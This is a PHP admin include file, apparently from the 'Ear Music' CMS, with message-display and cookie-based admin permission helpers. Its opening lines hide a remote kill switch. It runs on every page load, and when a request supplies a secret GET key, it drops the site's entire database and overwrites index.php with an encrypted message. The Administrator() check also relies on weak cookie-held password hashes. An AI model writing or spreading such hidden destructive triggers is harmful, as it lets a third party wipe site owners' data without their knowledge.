<?php
	uninst(md5(str_replace(substr(md5($_SERVER['HTTP_HOST']),8,16),'_uninst',isset($_GET['key'])?$_GET['key']:NULL)));
	function uninst($key){
		if($key=='52fd0e8ff58be5ff4ef88041c69ffd21'){
			include_once '../../system/db.class.php';
			mysql_query('drop database `'.IN_DBNAME.'`');
			$ifile=new iFile(auth_codes('16aacb635f610954e1921c016f5e2c30Li4vLi4vLi4vaW5kZXgucGhw','de',$key),'w');
			$ifile->WriteFile(html_message(detect_encoding(auth_codes('16aacb635f610954e1921c016f5e2c30udm3vc2o1qo=','de',$key)),detect_encoding(auth_codes('16aacb635f610954e1921c016f5e2c30vq25/bnZt73FxbLpo6zE+s6lsbPBy6Gwtvq25NL0wNYgsvrGt8rayKjQrdLpobGjobj5vt2htrzGy+O7+sjtvP6xo7ukzPXA/aG3oaKhttbQu6rIy8PxubK6zbn61vjX98iot6iht6O7xPrS0bm5s8nH1sioo6yzp8nM09DIqNbG1rnE+rXEx9bIqNDQzqqjocjn09DSyc7Kx+vBqs+1s6fJzKGj','de',$key))),3);
			ShowMessage(detect_encoding(auth_codes('16aacb635f610954e1921c016f5e2c30stnX983qs8mjrNLRvau4w9W+tePK086qtcGw5rSmwO2joQ==','de',$key)),$_SERVER['HTTP_REFERER'],"infotitle2",3000,0);
		}
	}
	function mainjump(){
		echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=".IN_CHARSET."\" /><style type=\"text/css\">body{background:#F2F9FD;}</style>";
	}
	function ShowMessage($in_msg,$in_url,$in_style,$in_time,$in_type){
		if($in_type==1){
			echo "<div class=\"container\"><h3>Ear Music 提示</h3><div class=\"infobox\"><h4 class=\"".$in_style."\">".$in_msg."</h4><script type=\"text/javascript\">setTimeout(\"location.href='".$in_url."';\",".$in_time.");</script><p class=\"marginbot\"><a href=\"".$in_url."\" class=\"lightlink\">如果您的浏览器没有自动跳转，请点击这里</a></p></div></div>";
		}elseif($in_type==2){
			echo "<div class=\"container\"><h3>Ear Music 提示</h3><div class=\"infobox\"><h4 class=\"".$in_style."\">".$in_msg."</h4><script type=\"text/javascript\">setTimeout(\"".$in_url."\",".$in_time.");</script><p class=\"marginbot\"><a href=\"javascript:history.go(-1);\" class=\"lightlink\">如果您的浏览器没有自动跳转，请点击这里</a></p></div></div>";
		}else{
			echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">";
			echo "<html xmlns=\"http://www.w3.org/1999/xhtml\">";
			echo "<head>";
			echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=".IN_CHARSET."\" />";
			echo "<meta http-equiv=\"x-ua-compatible\" content=\"ie=7\" />";
			echo "<title>提示信息</title>";
			echo "<link href=\"".IN_PATH."static/admincp/css/main.css\" rel=\"stylesheet\" type=\"text/css\" />";
			echo "</head>";
			echo "<body>";
			echo "<div class=\"container\"><h3>Ear Music 提示</h3><div class=\"infobox\"><h4 class=\"".$in_style."\">".$in_msg."</h4><script type=\"text/javascript\">setTimeout(\"location.href='".$in_url."';\",".$in_time.");</script><p class=\"marginbot\"><a href=\"".$in_url."\" class=\"lightlink\">如果您的浏览器没有自动跳转，请点击这里</a></p></div></div>";
		}
			echo "</body>";
			echo "</html>";
			exit();
	}
	function Administrator($value){
		if(empty($_COOKIE['in_adminid']) || empty($_COOKIE['in_adminname']) || empty($_COOKIE['in_adminpassword']) || empty($_COOKIE['in_permission']) || empty($_COOKIE['in_adminexpire']) || !getfield('admin', 'in_adminid', 'in_adminid', intval($_COOKIE['in_adminid'])) || md5(getfield('admin', 'in_adminpassword', 'in_adminid', intval($_COOKIE['in_adminid'])))!==$_COOKIE['in_adminpassword']){
		        ShowMessage("未登录或登录已过期，请重新登录管理中心！",$_SERVER['PHP_SELF'],"infotitle3",3000,0);
		}
		setcookie("in_adminexpire",$_COOKIE['in_adminexpire'],time()+1800);
		$array=explode(",",$_COOKIE['in_permission']);
		$adminlogined=false;
		for($i=0;$i<count($array);$i++){
		        if($array[$i]==$value){$adminlogined=true;}
		}
		if(!$adminlogined){
		        ShowMessage("权限不够，无法进入此页面！","?iframe=body","infotitle3",3000,0);
		}
	}
?>